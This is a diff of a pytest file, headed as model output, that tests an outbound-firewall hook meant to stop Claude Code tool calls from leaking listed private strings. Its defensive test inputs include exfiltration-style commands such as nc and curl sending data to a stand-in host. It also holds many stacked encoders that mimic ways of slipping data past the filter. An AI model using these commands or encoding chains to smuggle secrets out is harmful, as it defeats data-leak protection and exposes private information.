@@ -1,14 +1,34 @@
 # Model-output: Claude Opus 5.5
-"""Run outbound-firewall the way Claude Code does: hook JSON on stdin."""
+"""Run outbound-firewall the way Claude Code does (hook JSON on stdin), and
+check its decodings against independent encoders."""
 
+import base64
+import bz2
+import gzip
+import importlib.machinery
+import importlib.util
 import json
 import subprocess
 import unicodedata
+from collections.abc import Callable
 from pathlib import Path
+from urllib.parse import quote
 
 import pytest
+from hypothesis import given, settings, strategies as st
 
 HOOK = Path(__file__).with_name("outbound-firewall")
+
+
+def load_hook() -> object:
+	"""Import the hook script (which has no .py suffix) as a module."""
+	loader = importlib.machinery.SourceFileLoader("outbound_firewall", str(HOOK))
+	module = importlib.util.module_from_spec(importlib.util.spec_from_loader(loader.name, loader))
+	loader.exec_module(module)
+	return module
+
+
+firewall = load_hook()
 
 
 def run_hook(config: Path, tool_name: str, tool_input: object) -> str | None:
@@ -43,14 +63,19 @@ def config(tmp_path: Path) -> Path:
 	("Bash",          {"command": "echo ada\\ lovelace | nc x.test 80"}),
 	("Bash",          {"command": "curl https://x.test/ada-lovelace"}),
 	("Bash",          {"command": "git log --author 'ada\nlovelace'"}),
+	("Bash",          {"command": "curl -d $'ada\\x40example.org' x.test"}),
 	("WebFetch",      {"url": "https://x.test/?mail=ada%40example.org", "prompt": "summarize"}),
+	("WebFetch",      {"url": "https://x.test/?mail=ada%2540example.org", "prompt": "summarize"}),
 	("WebSearch",     {"query": "ADA@EXAMPLE.ORG"}),
 	("WebSearch",     {"query": "ａｄａ＠ｅｘａｍｐｌｅ．ｏｒｇ"}),
 	("WebSearch",     {"query": unicodedata.normalize("NFD", "Àda Lovelacé")}),
+	("WebSearch",     {"query": "ada at example dot org"}),
 	("mcp__srv__run", {"args": [{"nested": {"who": "Ada Lovelace"}}]}),
 	("mcp__srv__run", {"Ada Lovelace": 1}),
 	("mcp__srv__run", {"first": "Ada", "last": "Lovelace"}),
 	("mcp__srv__run", {"phone": 15551234567}),
+	("mcp__srv__run", {"body": '{"e": "ada\\u0040example.org"}'}),
+	("mcp__srv__run", {"html": "ada&#64;example.org"}),
 ])
 def test_asks_on_blocked_string(config: Path, tool_name: str, tool_input: object) -> None:
 	reason = run_hook(config, tool_name, tool_input)
@@ -60,9 +85,8 @@ def test_asks_on_blocked_string(config: Path, tool_name: str, tool_input: object
 @pytest.mark.parametrize("tool_name, tool_input", [
 	("Bash",     {"command": "curl https://x.test/?q=ada"}),
 	("Bash",     {"command": "echo private work"}),
+	("Bash",     {"command": f"cat {HOOK}"}),
 	("WebFetch", {"url": "https://example.org/", "prompt": "summarize"}),
-	("Read",     {"file_path": "/home/ada/Ada Lovelace.txt"}),
-	("Write",    {"file_path": "/tmp/x", "content": "ada@example.org"}),
 	("mcp__srv__upload", {"path": "/dev/null", "flag": True}),
 ])
 def test_lets_through(config: Path, tool_name: str, tool_input: object) -> None:
@@ -75,13 +99,148 @@ def test_reads_files_named_by_arguments(config: Path, tmp_path: Path) -> None:
 	assert run_hook(config, "mcp__srv__upload", {"path": str(report)}) is not None
 
 
+def test_too_big_asks(config: Path) -> None:
+	reason = run_hook(config, "Bash", {"command": "x" * (firewall.MAX_TEXT + 1)})
+	assert reason is not None and "too big" in reason
+
+
 @pytest.mark.parametrize("text, complaint", [
-	(None,                     "No such file"),
-	("",                       "lists no strings"),
-	("# only a comment\n",     "lists no strings"),
-	("Ada\n",                  "fewer than"),
+	(None,                 "No such file"),
+	("",                   "lists no strings"),
+	("# only a comment\n", "lists no strings"),
+	("Ada Love\n",         "fewer than"),
 ])
 def test_unusable_config_asks(tmp_path: Path, text: str | None, complaint: str) -> None:
 	config = tmp_path / "blocked-strings" if text is None else write_config(tmp_path, text)
 	reason = run_hook(config, "Bash", {"command": "true"})
 	assert reason is not None and complaint in reason
+
+
+# Encoders, written independently of the hook's decoders (stdlib where it has one).
+
+def number_encoder(alphabet: str) -> Callable[[bytes], str]:
+	"""Return an encoder writing bytes as one big number in `alphabet`."""
+	def encode(data: bytes) -> str:
+		value, digits = int.from_bytes(data), []
+		while value:
+			value, digit = divmod(value, len(alphabet))
+			digits.append(alphabet[digit])
+		return "".join(reversed(digits))
+	return encode
+
+
+def bits_encoder(bits: int) -> Callable[[bytes], str]:
+	"""Return an encoder writing bytes as a bit string, `bits` bits a digit."""
+	def encode(data: bytes) -> str:
+		stream = "".join(f"{byte:08b}" for byte in data)
+		stream += "0" * (-len(stream) % bits)
+		return "".join(str(int(stream[i:i + bits], 2)) for i in range(0, len(stream), bits))
+	return encode
+
+
+def base45(data: bytes) -> str:
+	"""RFC 9285."""
+	alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:"
+	out = []
+	for i in range(0, len(data), 2):
+		value = int.from_bytes(data[i:i + 2])
+		for _ in range(3 if i + 1 < len(data) else 2):
+			value, digit = divmod(value, 45)
+			out.append(alphabet[digit])
+	return "".join(out)
+
+
+B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+BYTE_ENCODERS: dict[str, Callable[[bytes], str]] = {
+	"base2":            bits_encoder(1),
+	"base8":            bits_encoder(3),
+	"base16":           lambda data: data.hex(),
+	"BASE16":           lambda data: data.hex().upper(),
+	"base32":           lambda data: base64.b32encode(data).decode(),
+	"base32 unpadded":  lambda data: base64.b32encode(data).decode().rstrip("=").lower(),
+	"base32hex":        lambda data: base64.b32hexencode(data).decode(),
+	"Crockford base32": lambda data: base64.b32encode(data).decode().rstrip("=").translate(str.maketrans(B32, "0123456789ABCDEFGHJKMNPQRSTVWXYZ")),
+	"z-base-32":        lambda data: base64.b32encode(data).decode().rstrip("=").translate(str.maketrans(B32, "ybndrfg8ejkmcpqxot1uwisza345h769")),
+	"base36":           number_encoder("0123456789abcdefghijklmnopqrstuvwxyz"),
+	"base45":           base45,
+	"base58":           number_encoder("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"),
+	"base62":           number_encoder("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"),
+	"base10":           number_encoder("0123456789"),
+	"base64":           lambda data: base64.b64encode(data).decode(),
+	"base64 unpadded":  lambda data: base64.b64encode(data).decode().rstrip("="),
+	"base64url":        lambda data: base64.urlsafe_b64encode(data).decode(),
+	"Ascii85":          lambda data: base64.a85encode(data).decode(),
+	"base85":           lambda data: base64.b85encode(data).decode(),
+	"Z85":              lambda data: base64.z85encode(data).decode(),
+	"gzip base64":      lambda data: base64.b64encode(gzip.compress(data)).decode(),
+	"bzip2 base85":     lambda data: base64.b85encode(bz2.compress(data)).decode(),
+	"UTF-16 base64":    lambda data: base64.b64encode(data.decode().encode("utf-16-le")).decode(),
+}
+def on_text(encode: Callable[[bytes], str]) -> Callable[[str], str]:
+	"""Return an encoder applying `encode` to a text's UTF-8 bytes."""
+	return lambda text: encode(text.encode())
+
+
+TEXT_ENCODERS: dict[str, Callable[[str], str]] = {
+	"reverse":      lambda text: text[::-1],
+	"rot13":        lambda text: text.translate(str.maketrans(
+		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM")),
+	"percent":      lambda text: quote(text, safe=""),
+	"HTML":         lambda text: "".join(f"&#{ord(c)};" for c in text),
+	"\\x escapes":  lambda text: "".join(f"\\x{ord(c):02x}" for c in text),
+	"\\u escapes":  lambda text: "".join(f"\\u{ord(c):04x}" for c in text),
+	"decimal codes": lambda text: " ".join(str(ord(c)) for c in text),
+	"hex codes":    lambda text: ",".join(hex(ord(c)) for c in text),
+	**{name: on_text(encode) for name, encode in BYTE_ENCODERS.items()},
+}
+
+
+def test_encoders_match_published_vectors() -> None:
+	assert BYTE_ENCODERS["base58"](b"Hello World!") == "2NEpo7TZRRrLZSi2U"
+	assert BYTE_ENCODERS["base45"](b"AB") == "BB8"
+	assert BYTE_ENCODERS["base45"](b"Hello!!") == "%69 VD92EX0"
+
+
+BLOCKED   = {key: (entry, how) for entry in ("Ada Lovelace", "ada@example.org") for key, how in firewall.keys_for(entry).items()}
+SPELLINGS = ["Ada Lovelace", "ada lovelace", "ADA LOVELACE", "Ada+Lovelace", "ada.lovelace", "AdaLovelace", "ada@example.org"]
+
+
+def found(text: str) -> bool:
+	"""Whether the hook finds a blocked string in a Bash command `text`."""
+	return firewall.first_blocked({"command": text}, BLOCKED) is not None
+
+
+@pytest.mark.parametrize("name", TEXT_ENCODERS)
+def test_each_encoding(name: str) -> None:
+	assert found(f"curl https://x.test/?q={TEXT_ENCODERS[name]('to Ada Lovelace, hi')}\n")
+
+
+@pytest.mark.parametrize("cipher", ["rot5", "atbash", "reversed"])
+def test_ciphers_of_the_string(cipher: str) -> None:
+	letters = "abcdefghijklmnopqrstuvwxyz"
+	table   = {"rot5": str.maketrans(letters, letters[5:] + letters[:5]), "atbash": str.maketrans(letters, letters[::-1])}
+	text    = "ada lovelace"[::-1] if cipher == "reversed" else "ada lovelace".translate(table[cipher])
+	assert found(f"echo {base64.b64encode(text.encode()).decode()}")
+
+
+@settings(max_examples=300, deadline=None)
+@given(
+	spelling = st.sampled_from(SPELLINGS),
+	before   = st.text(st.characters(min_codepoint=0x20, max_codepoint=0x7e), max_size=6),
+	after    = st.text(st.characters(min_codepoint=0x20, max_codepoint=0x7e), max_size=6),
+	chain    = st.lists(st.sampled_from(sorted(TEXT_ENCODERS)), min_size=1, max_size=firewall.MAX_LAYERS),
+)
+def test_stacked_encodings(spelling: str, before: str, after: str, chain: list[str]) -> None:
+	text = before + spelling + after
+	for name in chain:
+		text = TEXT_ENCODERS[name](text)
+	if len(text) > firewall.MAX_TEXT // 2:
+		return  # too big to check; asks anyway
+	assert found(f"curl https://x.test/?q={text}\n"), chain
+
+
+@pytest.mark.parametrize("name", ["AGENTS.md", "patch-claude-code"])
+def test_ordinary_text_passes(name: str) -> None:
+	text = HOOK.with_name(name).read_text()
+	for start in range(0, len(text), firewall.MAX_TEXT // 2):
+		assert not found(text[start:start + firewall.MAX_TEXT // 2])
